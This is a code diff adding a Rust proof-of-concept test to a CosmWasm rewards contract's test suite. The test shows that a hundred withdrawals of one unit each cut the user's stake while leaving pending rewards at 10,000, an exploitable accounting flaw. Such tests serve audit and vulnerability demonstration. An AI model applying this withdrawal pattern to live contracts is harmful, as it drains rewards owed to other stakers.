@@ -410,4 +410,61 @@ pub mod tests {
         assert_eq!(user_info.staked_amount, Uint128::zero());
         assert_eq!(user_info.pending_rewards, Uint128::zero());
     }
+
+    // We demonstrate how USER can gain an unfair amount of rewards 
+    #[test]
+    fn exploit_incremental_withdraw_flaw() {
+        // Base scenario
+        let (mut app, contract_addr) = proper_instantiate();
+
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER.to_string(),
+                },
+            )
+            .unwrap();
+        // Pending rewards initially 10_000 
+        assert_eq!(
+            user_info, 
+            UserRewardInfo {
+                staked_amount: Uint128::new(10_000),
+                user_index: Decimal::one(),
+                pending_rewards: Uint128::new(10_000),
+            }
+        );
+
+        // EXPLOIT: incremental withdraws
+        for _ in 0..100 {
+            app.execute_contract(
+                Addr::unchecked(USER),
+                contract_addr.clone(),
+                &ExecuteMsg::Withdraw {
+                    amount: Uint128::new(1),
+                },
+                &[],
+            )
+            .unwrap();
+        }
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER.to_string(),
+                },
+            )
+            .unwrap();
+        // Pending rewards initially 10_000 
+        assert_eq!(
+            user_info, 
+            UserRewardInfo {
+                staked_amount: Uint128::new(9_900),
+                user_index: Decimal::one(),
+                pending_rewards: Uint128::new(10_000),
+            }
+        ); 
+    }
 }
